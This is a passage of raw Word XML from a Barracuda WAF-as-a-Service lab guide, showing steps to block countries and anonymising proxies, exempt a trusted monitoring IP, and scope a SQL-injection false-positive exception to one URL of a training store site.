          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69CD9A1A" wp14:editId="7387CE1E">
            <wp:extent cx="300037" cy="209550"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="1723637544" name="Picture 172363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637544"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId50">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="300037" cy="209550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="007D01EA">
        <w:t>move all countries to the Blocked side</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E876035" w14:textId="4B22C317" w:rsidR="007D01EA" w:rsidRDefault="00A80AB6" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Move </w:t>
      </w:r>
      <w:r w:rsidR="007632C2">
        <w:t xml:space="preserve">your country to the allowed side using the single arrow </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="17593E1A" wp14:editId="3F1DF8C1">
            <wp:extent cx="214312" cy="214312"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1449851360" name="Picture 144985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0"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId51">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="214312" cy="214312"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6FC872" w14:textId="25EF258D" w:rsidR="007D01EA" w:rsidRDefault="007D01EA" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Turn on blocking for </w:t>
      </w:r>
      <w:r w:rsidR="00CC0B1F">
        <w:t xml:space="preserve">Barracuda Reputation Blocklist, </w:t>
      </w:r>
      <w:r>
        <w:t>TOR Nodes and Anonymous Proxies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DA250D" w14:textId="4D34B56F" w:rsidR="007D01EA" w:rsidRPr="007D01EA" w:rsidRDefault="007D01EA" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00CC0B1F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Save</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="57C0ED41">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD24BCC" w14:textId="7CFBF1B9" w:rsidR="0CFF0B51" w:rsidRDefault="0CFF0B51" w:rsidP="00172641">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C805AF3" w14:textId="77777777" w:rsidR="00F63ABA" w:rsidRDefault="00F63ABA" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="220C8D24" w14:textId="4C212CAD" w:rsidR="007D01EA" w:rsidRDefault="003972D7" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="SimSun" w:hAnsi="Cambria" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="64" w:name="_Toc293244894"/>
      <w:bookmarkStart w:id="65" w:name="_Toc72791976"/>
      <w:r>
        <w:t>Allow Trusted Clients</w:t>
      </w:r>
      <w:bookmarkEnd w:id="64"/>
      <w:bookmarkEnd w:id="65"/>
    </w:p>
    <w:p w14:paraId="3F2D05B2" w14:textId="0B54C87A" w:rsidR="007D01EA" w:rsidRDefault="00C170D8" w:rsidP="00C170D8">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0073039E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Scenario</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="6A783427">
        <w:t>We</w:t>
      </w:r>
      <w:r w:rsidR="007D01EA">
        <w:t xml:space="preserve"> have an anti-defacement service that accesses the s</w:t>
      </w:r>
      <w:r w:rsidR="265DB45F">
        <w:t xml:space="preserve">ite, </w:t>
      </w:r>
      <w:r w:rsidR="007D01EA">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="2B241EEE">
        <w:t xml:space="preserve">we </w:t>
      </w:r>
      <w:r w:rsidR="007D01EA">
        <w:t>want it to be exempt from all WAF checks</w:t>
      </w:r>
      <w:r w:rsidR="264EE83A">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="007D01EA">
        <w:t>The service always sends requests from IP 38.227.79.50</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DE336D" w14:textId="486930E7" w:rsidR="007D01EA" w:rsidRDefault="007D01EA" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Add the </w:t>
      </w:r>
      <w:r w:rsidRPr="32965056">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Trusted Hosts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> component.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266DA2F8" w14:textId="351E17CA" w:rsidR="3A943E86" w:rsidRDefault="3A943E86" w:rsidP="00172641">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C6F963A" wp14:editId="14645B49">
            <wp:extent cx="5334002" cy="1352550"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1680396535" name="Picture 168039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3965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34002" cy="1352550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5699A015" w14:textId="6F0A25BE" w:rsidR="007D01EA" w:rsidRDefault="007D01EA" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Enable Trusted Hosts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D0A2DB" w14:textId="5C87F587" w:rsidR="007D01EA" w:rsidRDefault="007D01EA" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00D150D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add Host</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="454CCDC4">
        <w:t>Enter “</w:t>
      </w:r>
      <w:r w:rsidR="008C2437">
        <w:t>Trusted</w:t>
      </w:r>
      <w:r w:rsidR="454CCDC4">
        <w:t xml:space="preserve">” for the Name.  </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Enter the IP 38.227.79.50 and mask 255.255.255.255.  </w:t>
      </w:r>
      <w:r w:rsidR="0382EA4C">
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">lick </w:t>
      </w:r>
      <w:r w:rsidRPr="00D150D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162B4352" w14:textId="4994FAA7" w:rsidR="55E0BB2E" w:rsidRDefault="007D01EA" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00D150D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Save</w:t>
      </w:r>
      <w:r w:rsidR="140210FC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="55E0BB2E">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B428DB0" w14:textId="6D589E78" w:rsidR="00D140A2" w:rsidRDefault="7F8F81F8" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="66" w:name="_Toc72791979"/>
      <w:bookmarkStart w:id="67" w:name="_Toc1018144365"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Adding an Exception for a </w:t>
      </w:r>
      <w:r w:rsidR="73122DFD">
        <w:t xml:space="preserve">simple </w:t>
      </w:r>
      <w:r w:rsidR="00D140A2">
        <w:t>False Positive</w:t>
      </w:r>
      <w:bookmarkEnd w:id="66"/>
      <w:r w:rsidR="00D450FF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="67"/>
    </w:p>
    <w:p w14:paraId="09AA82D7" w14:textId="1B2F8221" w:rsidR="003B48A4" w:rsidRDefault="00C170D8" w:rsidP="00A879B1">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00A4612D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Scenario</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="5EF02DAB" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Sometimes </w:t>
      </w:r>
      <w:r w:rsidR="0201BD69" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">application </w:t>
      </w:r>
      <w:r w:rsidR="2E054AAA" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">security settings </w:t>
      </w:r>
      <w:r w:rsidR="5EF02DAB" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">may block something </w:t>
      </w:r>
      <w:r w:rsidR="0347F676" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">that </w:t>
      </w:r>
      <w:r w:rsidR="3755F446" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">normally would be </w:t>
      </w:r>
      <w:r w:rsidR="0347F676" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">an </w:t>
      </w:r>
      <w:r w:rsidR="008C2437" w:rsidRPr="55E0BB2E">
        <w:t>attack but</w:t>
      </w:r>
      <w:r w:rsidR="0347F676" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="0347F676" w:rsidRPr="55E0BB2E">
        <w:t>actually something</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="0347F676" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="5EF02DAB" w:rsidRPr="55E0BB2E">
        <w:t>we want to allow</w:t>
      </w:r>
      <w:r w:rsidR="2720EEA5" w:rsidRPr="55E0BB2E">
        <w:t>.  This is known as a false positive</w:t>
      </w:r>
      <w:r w:rsidR="412294F1" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> and is commonly found in application security</w:t>
      </w:r>
      <w:r w:rsidR="42404EC2" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> in general</w:t>
      </w:r>
      <w:r w:rsidR="412294F1" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">, not just in WAF-as-a-Service.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760BE180" w14:textId="6963C4C6" w:rsidR="003B48A4" w:rsidRDefault="7DA3C65F" w:rsidP="00A879B1">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="66DA6B91" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">n this lesson </w:t>
      </w:r>
      <w:r w:rsidR="1666502A" w:rsidRPr="55E0BB2E">
        <w:t>we will easily correct a false positive</w:t>
      </w:r>
      <w:r w:rsidR="2111FF32" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> by adding an exception.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BEF0DFA" w14:textId="14590A65" w:rsidR="00662E89" w:rsidRDefault="007B3BC3" w:rsidP="00662E89">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="0015168C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="00662E89">
        <w:t xml:space="preserve">, for example:  </w:t>
      </w:r>
      <w:hyperlink r:id="rId53" w:history="1">
        <w:r w:rsidR="00662E89" w:rsidRPr="006B31C7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1840F2DF" w14:textId="089FFB0B" w:rsidR="003B48A4" w:rsidRDefault="2ECD76F9" w:rsidP="00A879B1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Click on </w:t>
      </w:r>
      <w:r w:rsidR="11B8231D" w:rsidRPr="00A4612D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Si</w:t>
      </w:r>
      <w:r w:rsidR="0647D90B" w:rsidRPr="00A4612D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>gn</w:t>
      </w:r>
      <w:r w:rsidR="11B8231D" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="11B8231D" w:rsidRPr="00A4612D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Guestbook</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B59A21" w14:textId="1B984623" w:rsidR="003B48A4" w:rsidRDefault="11B8231D" w:rsidP="00A879B1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Enter your </w:t>
      </w:r>
      <w:r w:rsidR="2ECD76F9" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">name and email and then </w:t>
      </w:r>
      <w:r w:rsidR="256CB0CB" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">copy and paste </w:t>
      </w:r>
      <w:r w:rsidR="2ECD76F9" w:rsidRPr="55E0BB2E">
        <w:t>the following for the comment text:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF90676" w14:textId="2A3EA80F" w:rsidR="003B48A4" w:rsidRDefault="2ECD76F9" w:rsidP="00172641">
      <w:commentRangeStart w:id="68"/>
      <w:r>
        <w:t xml:space="preserve">I tried to order from the union of your stores, but when I try to select a product, from your selection, I cannot! </w:t>
      </w:r>
      <w:commentRangeEnd w:id="68"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="68"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5B8D32" w14:textId="04E3DC15" w:rsidR="003B48A4" w:rsidRDefault="2ECD76F9" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You will see you are </w:t>
      </w:r>
      <w:r w:rsidR="24DC13B2">
        <w:t>blocked from posting the comment</w:t>
      </w:r>
      <w:r w:rsidR="00B4714F">
        <w:t>. Why?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51720D3B" w14:textId="1AC70949" w:rsidR="003B48A4" w:rsidRDefault="4C72CD17" w:rsidP="00B4714F">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3FF86766" wp14:editId="3880514D">
            <wp:extent cx="2028825" cy="1202989"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1713045915" name="Picture 171304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045915"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId54">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2028825" cy="1202989"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="41D95CE2">
        <w:t>*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370FCAF3" w14:textId="09E619CE" w:rsidR="2C24694F" w:rsidRDefault="76B4FA07" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="003B48A4">
        <w:t>ook at the Firewall Log</w:t>
      </w:r>
      <w:r w:rsidR="1C3A9038">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="003B48A4">
        <w:t xml:space="preserve"> to see why the request was blocked</w:t>
      </w:r>
      <w:r w:rsidR="3F6CA8C4">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5666C10B" wp14:editId="16C5ABD2">
            <wp:extent cx="3241268" cy="1376357"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="546672717" name="Picture 54667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672717"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId55">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3241268" cy="1376357"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="699764F2" w14:textId="2DF647CF" w:rsidR="003B48A4" w:rsidRDefault="4CED7E66" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The comment includes keyword “Union” in a way that matches a SQL </w:t>
      </w:r>
      <w:r w:rsidR="00E51BD3">
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>njection signature</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E4AD04" w14:textId="7B6BCC0D" w:rsidR="003B48A4" w:rsidRDefault="172E7C79" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We </w:t>
      </w:r>
      <w:r w:rsidR="58376400">
        <w:t xml:space="preserve">will </w:t>
      </w:r>
      <w:r w:rsidR="00AA743A">
        <w:t xml:space="preserve">turn off </w:t>
      </w:r>
      <w:r w:rsidR="003B48A4">
        <w:t xml:space="preserve">SQL Injection </w:t>
      </w:r>
      <w:r w:rsidR="58E87C1F">
        <w:t>blocking</w:t>
      </w:r>
      <w:r w:rsidR="003B48A4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="22C78DBF">
        <w:t xml:space="preserve">in </w:t>
      </w:r>
      <w:r w:rsidR="00E51BD3">
        <w:t xml:space="preserve">only </w:t>
      </w:r>
      <w:r w:rsidR="22C78DBF">
        <w:t>this part of the application</w:t>
      </w:r>
      <w:r w:rsidR="71E4D47F">
        <w:t xml:space="preserve"> but not </w:t>
      </w:r>
      <w:r w:rsidR="003B48A4">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="3337FCC0">
        <w:t>entire site</w:t>
      </w:r>
      <w:r w:rsidR="003B48A4">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:commentRangeStart w:id="70"/>
      <w:commentRangeEnd w:id="70"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="70"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C4E8D7" w14:textId="303E84C6" w:rsidR="00544385" w:rsidRPr="00544385" w:rsidRDefault="003B48A4" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Add the </w:t>
      </w:r>
      <w:commentRangeStart w:id="72"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">App </w:t>
      </w:r>
      <w:commentRangeEnd w:id="72"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="72"/>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Profiles </w:t>
      </w:r>
      <w:r>
        <w:t>component</w:t>
      </w:r>
      <w:r w:rsidR="00544385">
        <w:t xml:space="preserve">, then </w:t>
      </w:r>
      <w:r w:rsidR="00163BC3">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidR="00163BC3" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Add </w:t>
      </w:r>
      <w:r w:rsidR="653A5B93" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">URL </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338D65E6" w14:textId="67452696" w:rsidR="003B48A4" w:rsidRDefault="00544385" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For the </w:t>
      </w:r>
      <w:r w:rsidR="00163BC3" w:rsidRPr="00544385">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidR="00163BC3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">field, enter the URL </w:t>
      </w:r>
      <w:r w:rsidR="00163BC3">
        <w:t xml:space="preserve">from the firewall log: </w:t>
      </w:r>
      <w:r w:rsidR="00163BC3" w:rsidRPr="00D744BE">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00163BC3" w:rsidRPr="00D744BE">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00163BC3" w:rsidRPr="00D744BE">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>-bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00163BC3" w:rsidRPr="00D744BE">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>badstore.cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0330051A" w14:textId="6CF617AF" w:rsidR="003B48A4" w:rsidRPr="00276FCC" w:rsidRDefault="68ABA257" w:rsidP="00276FCC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="00163BC3">
        <w:t xml:space="preserve">eave all </w:t>
      </w:r>
      <w:r w:rsidR="00276FCC">
        <w:t xml:space="preserve">other </w:t>
      </w:r>
      <w:r w:rsidR="00163BC3">
        <w:t xml:space="preserve">settings </w:t>
      </w:r>
      <w:r w:rsidR="23211C5F">
        <w:t xml:space="preserve">at </w:t>
      </w:r>
      <w:r w:rsidR="00163BC3">
        <w:t>default</w:t>
      </w:r>
      <w:r w:rsidR="00276FCC">
        <w:t xml:space="preserve"> and click </w:t>
      </w:r>
      <w:r w:rsidR="00276FCC" w:rsidRPr="00276FCC">
        <w:rPr>
